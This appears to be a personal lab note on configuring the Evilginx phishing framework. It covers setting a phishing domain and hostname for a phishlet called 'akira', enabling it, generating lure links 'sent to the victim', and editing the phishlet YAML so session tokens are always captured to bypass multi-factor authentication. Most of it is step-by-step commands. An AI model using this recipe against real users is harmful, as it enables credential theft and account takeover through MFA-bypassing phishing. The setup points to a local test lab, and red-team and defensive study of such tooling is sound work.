# Basic Configuration

Set the base domain for all phishlets (e.g., evilsite.com)

```cs
config domain evilsite.com
```

Set the external IPv4 address of the current server (usually the VPS where `evilginx` is hosted)

```cs
config ipv4 127.0.0.1
```

Set the hostname for a phishlet (e.g., this.is.not.a.phishing.site.evilsite.com) and this hostname must always end with the configured domain (evilsite.com)

```cs
phishlets hostname akira lab.evilginx.evilsite.com
```

![[Pasted image 20250626122557.png]]

Enable the phishlet, this requires SSL/TLS configuration (available in `C:\Users\Dipeua\.evilginx\crt\ca.crt`)

```cs
phishlets enable akira
```

![[Pasted image 20250626123015.png]]

Generate entries for the hosts file to use localhost for testing (Local only)

```cs
phishlets get-hosts akira
```

Create a new lure for the given phishlet (this is the link that will be sent to the victim)

```cs
lures create akira
lures get-url 0
```

# Bypass MF2

Modify the `phishlets/example.yaml` file and add `always` after each `key` that we want to retrieve so that Evilginx takes ALL the data

```yaml
auth_tokens:
  - domain: 'akira.lab.evilginx.com'
    keys: ['token:always'] # :always
```

Display session information

```cs
sessions
sessions <id>
```
